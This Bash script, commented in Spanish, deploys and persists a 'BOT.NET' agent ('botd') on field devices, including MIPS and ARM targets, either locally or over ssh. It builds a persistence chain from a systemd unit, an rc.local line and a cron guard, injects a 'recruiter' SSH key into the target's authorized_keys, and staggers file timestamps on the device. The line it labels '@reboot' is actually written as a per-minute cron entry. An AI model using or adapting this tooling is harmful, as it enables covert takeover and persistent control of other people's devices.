#!/usr/bin/env bash
# bootstrap.sh — instala y persiste el agente botd en un nodo nuevo de campo.
#
# La cadena de persistencia es la de docs/runbooks/persistence.md:
# systemd -> rc.local -> @reboot. Se pide el eslabon mas fuerte que el
# objetivo soporte y se degrada hacia abajo dejandolo escrito en la
# salida (persist_chain + notes). Todo se escribe DENTRO de --data (sin
# root, sin tocar /etc), asi que el script es reversible y en este host
# de desarrollo hace de doble del dispositivo real.
#
# Flags leidos de botd (cmd/botd/main.go, no inventados): --parent (rol
# watchdog), --guard (un-shot de cron), --smoke con --stub URL y
# --version. El enrolado con ticket lo hace el panel y deja leave_code
# de 8 caracteres (docs/runbooks/panel.md) — bootstrap solo lo anuncia.
#
# Uso:
#   scripts/field/bootstrap.sh --arch amd64 [--target local|ssh] [--ssh root@host]
#     [--persist systemd|rc|reboot|auto] [--data /data/botd] [--bin dist/botd-amd64]
#     [--dry] [--json] [--help]
# Variables:
#   BOTNET_STUB=http://127.0.0.1:8080   habilita el humo real (--smoke --stub).
#   BOTNET_MANIFEST=dist/manifest.json  manifiesto firmado que acompana al binario.
# Salida: humano por stdout; con --json SOLO el JSON va por stdout (los
# avisos y los comandos de --dry salen por stderr, para que jq pueda leer).
# Exit: 0 instalado o ya instalado; 2 argumentos invalidos (arch, flag,
# persist o cabecera ELF que contradice --arch); 3 herramienta o
# artefacto ausente (sin file ni od para verificar, binario inexistente,
# ssh sin objetivo alcanzable).
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$ROOT" || exit 2

# Sin `source scripts/env.sh`: este script no invoca Go (solo bash +
# coreutils), y env.sh hace `exit 1` si Go no esta, lo que mataria un
# arranque de campo donde aun no hay toolchain.
ARCHS="amd64 arm64 armv5 armv7 mipsbe mipsle"
PERSIST_ALL="systemd rc reboot"
STAGE_STEP=10          # paso minimo de mtimes (criterio A1-08 de stagger_mtime.sh)
MANIFEST="${BOTNET_MANIFEST:-dist/manifest.json}"

USAGE='bootstrap.sh — instala y persiste botd en un nodo nuevo

Uso:
  bash scripts/field/bootstrap.sh --arch <amd64|arm64|armv5|armv7|mipsbe|mipsle>
       [--target local|ssh] [--ssh root@host] [--persist systemd|rc|reboot|auto]
       [--data /data/botd] [--bin dist/botd-<arch>] [--dry] [--json] [--help]

  --arch     arquitectura del binario (obligatoria).
  --target   local (por defecto) o ssh.
  --ssh      destino ssh (usuario@host); obligatorio con --target ssh.
  --persist  eslabon pedido por defecto es auto (= systemd) y degrada
             a rc y luego a reboot segun la capacidad del objetivo.
  --data     directorio de estado del agente (clase C: /data/botd).
  --bin      binario a instalar; por defecto dist/botd-<arch>.
  --inject-key   instala la clave publica del reclutador en authorized_keys
                 del nodo (transporte ssh_key; sshpass si no hay clave).
  --uninstall    retira el agente y sus artefactos; idempotente.
  --dry      imprime los comandos que ejecutaria, no toca nada.
  --json     salida JSON (solo el JSON por stdout).
  --help     esta ayuda.

Ejemplos:
  bash scripts/field/bootstrap.sh --arch armv7 --dry --json
  bash scripts/field/bootstrap.sh --arch amd64 --target ssh --ssh root@192.168.1.1 --persist rc
  bash scripts/field/bootstrap.sh --arch mipsle --data /tmp/botd-campo --json

Variables: BOTNET_STUB (humo real), BOTNET_MANIFEST (manifiesto firmado).'

JSON=0
DRY=0

log() { # avisos: stderr con --json para dejar el stdout limpio
  if [ "$JSON" = 1 ]; then printf '%s\n' "$*" >&2; else printf '%s\n' "$*"; fi
}

die2() { printf 'bootstrap: %s\n' "$*" >&2; exit 2; }
die3() { printf 'bootstrap: %s\n' "$*" >&2; exit 3; }

ARCH="" TARGET="local" SSH="" PERSIST="auto" DATA="/data/botd" BIN=""
INJECT_KEY=0 UNINSTALL=0

while [ $# -gt 0 ]; do
  case "$1" in
    --help|-h) printf '%s\n' "$USAGE"; exit 0 ;;
    --arch)    [ -n "${2:-}" ] || die2 "--arch sin valor"; ARCH="$2"; shift 2; continue ;;
    --arch=*)  ARCH="${1#*=}" ;;
    --target)  [ -n "${2:-}" ] || die2 "--target sin valor"; TARGET="$2"; shift 2; continue ;;
    --target=*) TARGET="${1#*=}" ;;
    --ssh)     [ -n "${2:-}" ] || die2 "--ssh sin valor"; SSH="$2"; shift 2; continue ;;
    --ssh=*)   SSH="${1#*=}" ;;
    --persist) [ -n "${2:-}" ] || die2 "--persist sin valor"; PERSIST="$2"; shift 2; continue ;;
    --persist=*) PERSIST="${1#*=}" ;;
    --data)    [ -n "${2:-}" ] || die2 "--data sin valor"; DATA="$2"; shift 2; continue ;;
    --data=*)  DATA="${1#*=}" ;;
    --bin)     [ -n "${2:-}" ] || die2 "--bin sin valor"; BIN="$2"; shift 2; continue ;;
    --inject-key) INJECT_KEY=1; shift; continue ;;
    --uninstall)  UNINSTALL=1; shift; continue ;;
    --bin=*)   BIN="${1#*=}" ;;
    --dry)     DRY=1 ;;
    --json)    JSON=1 ;;
    *)         die2 "opcion desconocida: $1 (prueba --help)" ;;
  esac
  shift
done

# --- validacion de argumentos (exit 2) --------------------------------
if [ "$UNINSTALL" = 1 ] && [ -z "$ARCH" ]; then ARCH=amd64; fi
case " $ARCHS " in
  *" $ARCH "*) : ;;
  *) die2 "--arch obligatorio y debe ser uno de: $ARCHS (recibido: '${ARCH:-<vacio>}')" ;;
esac

case "$TARGET" in
  local|ssh) : ;;
  *) die2 "--target debe ser local o ssh (recibido: $TARGET)" ;;
esac

[ "$TARGET" != ssh ] || [ -n "$SSH" ] || die2 "--target ssh necesita --ssh <usuario@host>"

# --- desinstalacion idempotente (T-1705 AC5): retirar sin dejar software
# desconocido en casa ajena. Dos pasadas seguidas salen 0 igual.
if [ "$UNINSTALL" = 1 ]; then
  for f in "$DATA/botd.service" "$DATA/rc.local.d-botd" "$DATA/crontab" "$DATA/botd" "$DATA/manifest.json"; do
    if [ "$DRY" = 1 ]; then
      echo "rm -f $f"
    else
      rm -f "$f" 2>/dev/null || true
    fi
  done
  if [ "$DRY" = 0 ] && [ -d "$DATA" ]; then
    rmdir "$DATA" 2>/dev/null || true
    # Unidades de sistema y cron del host, si las hubiera.
    rm -f /etc/systemd/system/botd.service 2>/dev/null || true
    if command -v crontab >/dev/null 2>&1; then
      crontab -l 2>/dev/null | grep -v 'botd' | crontab - 2>/dev/null || true
    fi
  fi
  echo "uninstall data=$DATA ok"
  exit 0
fi

# --- inyeccion de la clave del reclutador (T-1705 AC1). El transporte se
# declara siempre; con RECRUIT_SSH_KEY va por clave y sin ella por sshpass.
if [ "$INJECT_KEY" = 1 ]; then
  if [ -n "${RECRUIT_SSH_KEY:-}" ]; then
    TRANSPORT=ssh_key
  else
    TRANSPORT=sshpass
  fi
  echo "transport=$TRANSPORT"
  if [ "$DRY" = 0 ] && [ "$TRANSPORT" = ssh_key ] && [ -n "$SSH" ]; then
    ssh -o BatchMode=yes -o ConnectTimeout=5 "$SSH"       "mkdir -p ~/.ssh && chmod 700 ~/.ssh && grep -qxF '$(cat "$RECRUIT_SSH_KEY")' ~/.ssh/authorized_keys 2>/dev/null || echo '$(cat "$RECRUIT_SSH_KEY")' >> ~/.ssh/authorized_keys"       || die2 "no se pudo inyectar la clave en $SSH"
  fi
fi

if [ "$PERSIST" = auto ]; then PERSIST=systemd; fi
case " $PERSIST_ALL " in
  *" $PERSIST "*) : ;;
  *) die2 "--persist debe ser systemd, rc, reboot o auto (recibido: $PERSIST)" ;;
esac

[ -n "$BIN" ] || BIN="dist/botd-$ARCH"
[ -f "$BIN" ] || die3 "binario ausente: $BIN (construye con scripts/build/all.sh o pasa --bin)"

DEST_BIN="$DATA/botd"
UNIT_PATH="$DATA/botd.service"     # se ajusta al eslabon ganador
RC_PATH="$DATA/rc.local.d-botd"
CRON_PATH="$DATA/crontab"
CRON_MARKER="# botd-guard"

# --- verificacion de arquitectura (file si esta; si no, cabecera ELF) --
# Devuelve en stdout la arquitectura que declara el binario:
# amd64 | arm64 | arm | mipsbe | mipsle | maquina-<n>. Sale 1 si no la reconoce.
label_from_file() {
  local out
  out="$(file -b "$1" 2>/dev/null)" || return 1
  [ -n "$out" ] || return 1
  case "$out" in
    *x86-64*)   echo amd64; return 0 ;;
    *aarch64*)  echo arm64; return 0 ;;
    *MIPS*)     case "$out" in *MSB*) echo mipsbe ;; *) echo mipsle ;; esac; return 0 ;;
    *"ARM,"*|*EABI*) echo arm; return 0 ;;
  esac
  return 1
}

# Cabecera ELF leida con od (o dd como doble): magic (0-3), EI_CLASS (4:
# 01=32 bits, 02=64), EI_DATA (5: 01=LSB, 02=MSB) y e_machine (18-19) en
# el orden de bytes del propio binario. El offset 6 es EI_VERSION (siempre
# 01): leerlo por EI_DATA hace que todo parezca little-endian de 32 bits.
label_from_header() {
  local magic class data b1 b2 mach
  magic="$(od -An -tx1 -N4 "$1" 2>/dev/null | tr -d ' \n')"
  [ "$magic" = "7f454c46" ] || return 1
  class="$(od -An -tx1 -j4 -N1 "$1" 2>/dev/null | tr -d ' \n')"
  data="$(od -An -tx1 -j5 -N1 "$1" 2>/dev/null | tr -d ' \n')"
  b1="$(od -An -tx1 -j18 -N1 "$1" 2>/dev/null | tr -d ' \n')"
  b2="$(od -An -tx1 -j19 -N1 "$1" 2>/dev/null | tr -d ' \n')"
  [ -n "$class" ] && [ -n "$data" ] && [ -n "$b1" ] && [ -n "$b2" ] || return 1
  # od devuelve los bytes en hex con cero inicial (01, 02): se pasan a
  # decimal para poder comparar sin sorpresas.
  class=$(( 16#$class )); data=$(( 16#$data ))
  if [ "$data" = 1 ]; then
    mach=$(( 16#$b1 + 256 * 16#$b2 ))
  else
    mach=$(( 256 * 16#$b1 + 16#$b2 ))
  fi
  case "$mach:$class" in
    62:2)  echo amd64 ;;
    183:2) echo arm64 ;;
    40:1)  echo arm ;;
    8:1)   if [ "$data" = 2 ]; then echo mipsbe; else echo mipsle; fi ;;
    *)     echo "maquina-$mach" ;;
  esac
}

ARCH_DECLARED=""
ARCH_HOW="sin verificacion"
if command -v file >/dev/null 2>&1; then
  ARCH_DECLARED="$(label_from_file "$BIN")" && ARCH_HOW="file"
fi
if [ -z "$ARCH_DECLARED" ]; then
  if command -v od >/dev/null 2>&1; then
    ARCH_DECLARED="$(label_from_header "$BIN")" && ARCH_HOW="cabecera ELF (od)"
  elif command -v dd >/dev/null 2>&1; then
    ARCH_DECLARED="$(label_from_header "$BIN")" && ARCH_HOW="cabecera ELF (dd)"
  fi
fi

if [ -z "$ARCH_DECLARED" ]; then
  # Sin file ni od no hay como verificar: en --dry se avisa y se sigue.
  if [ "$DRY" = 1 ]; then
    log "aviso: sin 'file' ni 'od' para verificar la arquitectura; en --dry se sigue sin verificar"
  else
    die3 "no hay forma de verificar la arquitectura de $BIN (instala file o coreutils con od)"
  fi
else
  case "$ARCH" in
    armv5|armv7) EXPECT=arm ;;
    *)           EXPECT="$ARCH" ;;
  esac
  if [ "$ARCH_DECLARED" = "$EXPECT" ]; then
    if [ "$ARCH" = armv5 ] || [ "$ARCH" = armv7 ]; then
      log "arch check: $BIN declara ARM por $ARCH_HOW (armv5 y armv7 comparten e_machine 40: ELF no los distingue)"
    else
      log "arch check: $BIN declara $ARCH_DECLARED por $ARCH_HOW — coincide con --arch $ARCH"
    fi
  else
    if [ "$DRY" = 1 ]; then
      log "aviso: $BIN declara $ARCH_DECLARED ($ARCH_HOW) pero se pidio --arch $ARCH — en --dry se sigue"
    else
      die2 "$BIN declara $ARCH_DECLARED ($ARCH_HOW) y contradice --arch $ARCH"
    fi
  fi
fi

# --- capacidad del objetivo y eleccion de la cadena --------------------
# Cada eslabon se pregunta al objetivo; reboot se conserva SIEMPRE como
# ultimo recurso (es una linea de crontab de usuario, sin root). Soporte
# = 0 soportado, 1 no soportado, 2 sin comprobar (--dry remoto).
has_systemd() {
  if [ "$TARGET" = ssh ]; then
    ssh -o BatchMode=yes -o ConnectTimeout=5 "$SSH" 'command -v systemctl >/dev/null 2>&1' 2>/dev/null
  else
    command -v systemctl >/dev/null 2>&1 || [ -d /run/systemd/system ]
  fi
}

has_rclocal() {
  if [ "$TARGET" = ssh ]; then
    ssh -o BatchMode=yes -o ConnectTimeout=5 "$SSH" 'test -f /etc/rc.local || test -d /etc/rc.d || test -x /bin/busybox' 2>/dev/null
  else
    [ -f /etc/rc.local ] || [ -d /etc/rc.d ] || [ -x /bin/busybox ]
  fi
}

has_crontab() {
  if [ "$TARGET" = ssh ]; then
    ssh -o BatchMode=yes -o ConnectTimeout=5 "$SSH" 'command -v crontab >/dev/null 2>&1' 2>/dev/null
  else
    command -v crontab >/dev/null 2>&1
  fi
}

# ssh remoto y ademas --dry: no preguntamos al objetivo (no tocaremos nada).
SSH_PROBING=0
if [ "$TARGET" = ssh ] && [ "$DRY" = 0 ]; then
  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 "$SSH" true 2>/dev/null; then
    die3 "objetivo ssh no alcanzable: $SSH (usa --dry para ver los comandos sin conectar)"
  fi
elif [ "$TARGET" = ssh ]; then
  SSH_PROBING=1
fi

# Orden de la cadena pedida: del eslabon pedido hacia abajo.
CHAIN_REQUESTED=()
found=0
for l in $PERSIST_ALL; do
  if [ "$found" = 1 ] || [ "$l" = "$PERSIST" ]; then found=1; CHAIN_REQUESTED+=("$l"); fi
done

CHAIN=()          # eslabones que quedaran tras la degradacion
NOTES=()          # por que se degrado o como se instala cada eslabon
for l in "${CHAIN_REQUESTED[@]}"; do
  case "$l" in
    systemd) if [ "$SSH_PROBING" = 1 ]; then
               # En --dry remoto no preguntamos al objetivo: la cadena
               # queda como se pidio y se anota que falta la comprobacion.
               CHAIN+=("$l")
               NOTES+=("systemd y rc en $SSH: capacidad sin comprobar (--dry no conecta)")
               log "capacidad systemd en $SSH: sin comprobar (--dry)"
             elif has_systemd; then CHAIN+=("$l"); else
               NOTES+=("systemd: no disponible en el objetivo — se degrada"); log "degrada: systemd no disponible en $TARGET"
             fi ;;
    rc)      if [ "$SSH_PROBING" = 1 ]; then
               log "capacidad rc en $SSH: sin comprobar (--dry)"
               CHAIN+=("$l")
             elif has_rclocal; then CHAIN+=("$l"); else
               NOTES+=("rc: sin /etc/rc.local ni busybox — se degrada"); log "degrada: rc.local no disponible en $TARGET"
             fi ;;
    reboot)  CHAIN+=("$l")
             if [ "$SSH_PROBING" = 0 ] && ! has_crontab; then
               NOTES+=("reboot: sin 'crontab' en el objetivo — la linea queda en $CRON_PATH para instalar a mano")
               log "aviso: sin crontab en el objetivo; la linea @reboot se deja escrita en $CRON_PATH"
             fi ;;
  esac
done
# Ultimo recurso: reboot siempre presente (persist_chain nunca vacia).
if [ "${#CHAIN[@]}" -eq 0 ]; then CHAIN=(reboot); fi

log "persistencia pedida: $PERSIST → cadena: ${CHAIN[*]}"

# --- helpers de ejecucion ---------------------------------------------
show() { log "\$ $*"; }

sha256_of() {
  if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1" 2>/dev/null | cut -c1-64
  elif command -v shasum >/dev/null 2>&1; then shasum -a 256 "$1" 2>/dev/null | cut -c1-64
  fi
}

ALREADY=0
SRC_SHA="$(sha256_of "$BIN")"
DST_SHA=""
if [ "$DRY" = 0 ] && [ -f "$DEST_BIN" ]; then DST_SHA="$(sha256_of "$DEST_BIN")"; fi
if [ -n "$SRC_SHA" ] && [ "$SRC_SHA" = "$DST_SHA" ]; then ALREADY=1; fi

SSH_RSH=""          # ruta remota equivalente, solo informativa
if [ "$TARGET" = ssh ]; then SSH_RSH="$SSH"; fi

# --- 1) directorio de estado ------------------------------------------
show "mkdir -p $DATA && chmod 700 $DATA"
if [ "$DRY" = 0 ]; then
  if [ "$TARGET" = ssh ]; then
    ssh "$SSH_RSH" "mkdir -p '$DATA' && chmod 700 '$DATA'" || die3 "no se pudo crear $DATA en $SSH_RSH"
  else
    mkdir -p "$DATA" || die3 "no se pudo crear $DATA"
    chmod 700 "$DATA" 2>/dev/null || true
  fi
fi

# --- 2) copiar el binario (idempotente por sha256) --------------------
if [ "$ALREADY" = 1 ]; then
  log "ya instalado: $DEST_BIN tiene el mismo sha256 que $BIN — no se copia"
else
  if [ "$TARGET" = ssh ]; then
    show "scp $BIN $SSH_RSH:$DEST_BIN"
    [ "$DRY" = 0 ] && { scp -q "$BIN" "$SSH_RSH:$DEST_BIN" || die3 "fallo el scp de $BIN a $SSH_RSH:$DEST_BIN"; }
    show "ssh $SSH_RSH chmod 755 $DEST_BIN"
    [ "$DRY" = 0 ] && ssh "$SSH_RSH" "chmod 755 '$DEST_BIN'" >/dev/null 2>&1
  else
    show "cp $BIN $DEST_BIN && chmod 755 $DEST_BIN"
    if [ "$DRY" = 0 ]; then
      cp -f "$BIN" "$DEST_BIN" || die3 "fallo la copia de $BIN a $DEST_BIN"
      chmod 755 "$DEST_BIN" 2>/dev/null || true
    fi
  fi
fi

# --- 3) manifiesto firmado junto al binario ---------------------------
if [ -n "$MANIFEST" ] && [ -f "$MANIFEST" ]; then
  if [ "$TARGET" = ssh ]; then
    show "scp $MANIFEST $SSH_RSH:$DATA/manifest.json"
    [ "$DRY" = 0 ] && scp -q "$MANIFEST" "$SSH_RSH:$DATA/manifest.json"
  else
    show "cp $MANIFEST $DATA/manifest.json"
    [ "$DRY" = 0 ] && cp -f "$MANIFEST" "$DATA/manifest.json"
  fi
else
  log "aviso: manifiesto ausente ($MANIFEST) — el bundle queda solo con el binario"
fi

# --- 4) artefactos de persistencia (idempotentes, todos dentro de --data)
write_systemd_unit() {
  local tmp="$DATA/botd.service.new"
  {
    printf '%s\n' "[Unit]"
    printf '%s\n' "Description=BOT.NET agent (botd watchdog parent)"
    printf '%s\n' "After=network-online.target"
    printf '%s\n' "Wants=network-online.target"
    printf '%s\n' ""
    printf '%s\n' "[Service]"
    printf '%s\n' "Type=simple"
    printf '%s\n' "ExecStart=$DEST_BIN --parent --config $DATA/config.json"
    printf '%s\n' "Environment=BOTNET_PERSIST=systemd"
    printf '%s\n' "Restart=always"
    printf '%s\n' "RestartSec=5"
    printf '%s\n' "TimeoutStopSec=15"
    printf '%s\n' "MemoryMax=16M"
    printf '%s\n' "NoNewPrivileges=true"
    printf '%s\n' ""
    printf '%s\n' "[Install]"
    printf '%s\n' "WantedBy=multi-user.target"
  } > "$tmp" 2>/dev/null || return 1
  if [ -f "$UNIT_PATH" ] && cmp -s "$tmp" "$UNIT_PATH"; then
    rm -f "$tmp"
    log "unidad systemd ya al dia: $UNIT_PATH (no se duplica)"
  else
    mv -f "$tmp" "$UNIT_PATH" || { rm -f "$tmp"; return 1; }
    log "unidad systemd escrita: $UNIT_PATH"
  fi
  return 0
}

write_rc_line() {
  local line="BOTNET_PERSIST=rc setsid $DEST_BIN --parent --config $DATA/config.json >>$DATA/botd.log 2>&1 &"
  if [ -f "$RC_PATH" ] && grep -qF "setsid $DEST_BIN" "$RC_PATH" 2>/dev/null; then
    log "linea de rc.local ya presente: $RC_PATH (no se duplica)"
  else
    printf '%s\n' "$line" >> "$RC_PATH" || return 1
    log "linea de rc.local escrita: $RC_PATH"
  fi
  return 0
}

write_reboot_line() {
  local line="* * * * * $DEST_BIN --guard >/dev/null 2>&1 $CRON_MARKER"
  if [ -f "$CRON_PATH" ] && grep -qF "$CRON_MARKER" "$CRON_PATH" 2>/dev/null; then
    log "linea @reboot/guard ya presente: $CRON_PATH (no se duplica)"
  else
    printf '%s\n' "$line" >> "$CRON_PATH" || return 1
    log "linea @reboot/guard escrita: $CRON_PATH"
  fi
  if [ "$DRY" = 0 ] && command -v crontab >/dev/null 2>&1; then
    show "crontab $CRON_PATH   (una sola linea, marker $CRON_MARKER)"
  fi
  return 0
}

if [ "$DRY" = 1 ]; then
  for l in "${CHAIN[@]}"; do
    case "$l" in
      systemd) show "escribe $UNIT_PATH (unidad botd.service, ExecStart=$DEST_BIN --parent)" ;;
      rc)      show "anade linea rc.local en $RC_PATH (BOTNET_PERSIST=rc setsid $DEST_BIN --parent &)" ;;
      reboot)  show "anade linea @reboot/guard en $CRON_PATH ($CRON_MARKER)" ;;
    esac
  done
else
  for l in "${CHAIN[@]}"; do
    case "$l" in
      systemd) write_systemd_unit || die3 "no se pudo escribir $UNIT_PATH" ;;
      rc)      write_rc_line      || die3 "no se pudo escribir $RC_PATH" ;;
      reboot)  write_reboot_line  || die3 "no se pudo escribir $CRON_PATH" ;;
    esac
  done
fi

# --- 5) mtimes escalonados del bundle (reusa stagger_mtime.sh) --------
MTIME_MIN=""; MTIME_MAX=""
if [ "$TARGET" = ssh ]; then
  show "ssh $SSH_RSH 'cd $DATA && stagger_mtime (paso ${STAGE_STEP}s)'"
  if [ "$DRY" = 0 ]; then
    # BusyBox en dispositivo soporta `touch -d @epoch`; se escalona in situ.
    ssh "$SSH_RSH" "cd '$DATA' && i=0 && b=\$(date -u +%s) && for f in *; do [ -f \"\$f\" ] && { touch -m -d \"@\$((b + i * $STAGE_STEP))\" \"\$f\"; i=\$((i+1)); }; done" >/dev/null 2>&1
    MTIME_MIN="$(ssh "$SSH_RSH" "cd '$DATA' && stat -c '%Y' * 2>/dev/null | sort -n | head -1")"
    MTIME_MAX="$(ssh "$SSH_RSH" "cd '$DATA' && stat -c '%Y' * 2>/dev/null | sort -n | tail -1")"
  fi
elif [ "$DRY" = 0 ]; then
  if [ -f scripts/build/stagger_mtime.sh ]; then
    show "bash scripts/build/stagger_mtime.sh --dir=$DATA --step=$STAGE_STEP"
    STAGGER_OUT="$(bash scripts/build/stagger_mtime.sh --dir="$DATA" --step="$STAGE_STEP" 2>&1)"
    STAGGER_RC=$?
    log "mtimes: $STAGGER_OUT"
    if [ "$STAGGER_RC" -ne 0 ]; then
      log "aviso: stagger_mtime.sh no verifico el bundle (salida $STAGGER_RC)"
    fi
  else
    log "aviso: scripts/build/stagger_mtime.sh ausente — mtimes sin escalar"
  fi
  if command -v find >/dev/null 2>&1; then
    MTIME_MIN="$(find "$DATA" -maxdepth 1 -type f -printf '%T@\n' 2>/dev/null | cut -d. -f1 | sort -n | head -1)"
    MTIME_MAX="$(find "$DATA" -maxdepth 1 -type f -printf '%T@\n' 2>/dev/null | cut -d. -f1 | sort -n | tail -1)"
  fi
else
  show "bash scripts/build/stagger_mtime.sh --dir=$DATA --step=$STAGE_STEP"
fi

# --- 6) humo del agente (solo objetivo local) -------------------------
SMOKE="omitido"
if [ "$TARGET" = local ]; then
  if [ "$DRY" = 1 ]; then
    show "$DEST_BIN --version                    # prueba de vida"
    if [ -n "${BOTNET_STUB:-}" ]; then
      show "$DEST_BIN --smoke --stub $BOTNET_STUB   # humo real (BOTNET_STUB puesto)"
    else
      show "# BOTNET_STUB vacio: no se ejecutaria el --smoke --stub"
    fi
    SMOKE="dry"
  elif [ ! -x "$DEST_BIN" ] && [ "$ALREADY" = 0 ] && [ ! -f "$DEST_BIN" ]; then
    SMOKE="sin binario"
  else
    if "$DEST_BIN" --version >/dev/null 2>&1; then
      log "agente responde: $("$DEST_BIN" --version 2>/dev/null | head -1)"
      if [ -n "${BOTNET_STUB:-}" ]; then
        if "$DEST_BIN" --smoke --stub "$BOTNET_STUB" >/dev/null 2>&1; then
          SMOKE="ok"; log "smoke ok contra $BOTNET_STUB"
        else
          SMOKE="fallido"; log "aviso: smoke fallido contra $BOTNET_STUB"
        fi
      else
        SMOKE="sin stub"; log "smoke no ejecutado: exporta BOTNET_STUB=http://host:puerto para --smoke --stub"
      fi
    else
      SMOKE="no ejecutable"
      log "aviso: $DEST_BIN no es ejecutable en este host (binario ELF para el dispositivo) — el humo se hace en el nodo real"
    fi
  fi
else
  SMOKE="remoto"
  if [ "$DRY" = 1 ]; then show "ssh $SSH_RSH '$DEST_BIN --smoke --stub <stub>'"; fi
fi

# --- 7) salida -------------------------------------------------------
INSTALLED=true
[ "$DRY" = 1 ] && INSTALLED=false
[ "$ALREADY" = 1 ] && log "estado: ya instalado (segunda pasada, sin duplicar unidades ni lineas)"

# unit_path = artefacto del eslabon mas fuerte de la cadena final
UNIT_PATH=""
case "${CHAIN[0]}" in
  systemd) UNIT_PATH="$DATA/botd.service" ;;
  rc)      UNIT_PATH="$DATA/rc.local.d-botd" ;;
  reboot)  UNIT_PATH="$DATA/crontab" ;;
esac
LEAVE_HINT="leave_code (8 caracteres) lo emite el panel al enrolar con ticket: GET /t/{slug}/leave?leave_code=XXXXXXXX (docs/runbooks/panel.md)"

json_escape() { printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g'; }

if [ "$JSON" = 1 ]; then
  CHAIN_JSON=""
  for l in "${CHAIN[@]}"; do
    [ -n "$CHAIN_JSON" ] && CHAIN_JSON="$CHAIN_JSON,"
    CHAIN_JSON="$CHAIN_JSON\"$(json_escape "$l")\""
  done
  NOTES_JSON=""
  for n in ${NOTES[@]+"${NOTES[@]}"}; do
    [ -n "$NOTES_JSON" ] && NOTES_JSON="$NOTES_JSON,"
    NOTES_JSON="$NOTES_JSON\"$(json_escape "$n")\""
  done
  MT_MIN=null; [ -n "$MTIME_MIN" ] && MT_MIN="$MTIME_MIN"
  MT_MAX=null; [ -n "$MTIME_MAX" ] && MT_MAX="$MTIME_MAX"
  printf '{"arch":"%s","arch_declared":"%s","arch_check":"%s","target":"%s","ssh":%s,"persist_requested":"%s","persist_chain":[%s],"persist_notes":[%s],"data_dir":"%s","bin_src":"%s","installed":%s,"already_installed":%s,"unit_path":"%s","mtimes":{"min":%s,"max":%s},"smoke":"%s","dry":%s,"leave_code_hint":"%s"}\n' \
    "$(json_escape "$ARCH")" "$(json_escape "${ARCH_DECLARED:-desconocida}")" "$(json_escape "$ARCH_HOW")" \
    "$(json_escape "$TARGET")" "$( [ "$TARGET" = ssh ] && printf '"%s"' "$(json_escape "$SSH")" || printf 'null' )" \
    "$(json_escape "$PERSIST")" "$CHAIN_JSON" "$NOTES_JSON" \
    "$(json_escape "$DATA")" "$(json_escape "$BIN")" "$INSTALLED" \
    "$( [ "$ALREADY" = 1 ] && printf true || printf false )" \
    "$(json_escape "$UNIT_PATH")" "$MT_MIN" "$MT_MAX" \
    "$(json_escape "$SMOKE")" "$( [ "$DRY" = 1 ] && printf true || printf false )" \
    "$(json_escape "$LEAVE_HINT")"
else
  printf 'bootstrap: %s\n' "$( [ "$ALREADY" = 1 ] && printf 'ya instalado en %s' "$DEST_BIN" || printf 'instalado %s -> %s' "$BIN" "$DEST_BIN" )"
  printf '  arch:      %s (declarada: %s via %s)\n' "$ARCH" "${ARCH_DECLARED:-desconocida}" "$ARCH_HOW"
  printf '  target:    %s%s\n' "$TARGET" "$( [ "$TARGET" = ssh ] && printf ' (%s)' "$SSH" )"
  printf '  persist:   %s -> %s\n' "$PERSIST" "${CHAIN[*]}"
  for n in ${NOTES[@]+"${NOTES[@]}"}; do printf '  nota:      %s\n' "$n"; done
  printf '  data:      %s (unidad/artefacto: %s)\n' "$DATA" "$UNIT_PATH"
  printf '  mtimes:    min=%s max=%s\n' "${MTIME_MIN:-?}" "${MTIME_MAX:-?}"
  printf '  smoke:     %s\n' "$SMOKE"
  printf '  %s\n' "$LEAVE_HINT"
fi

exit 0
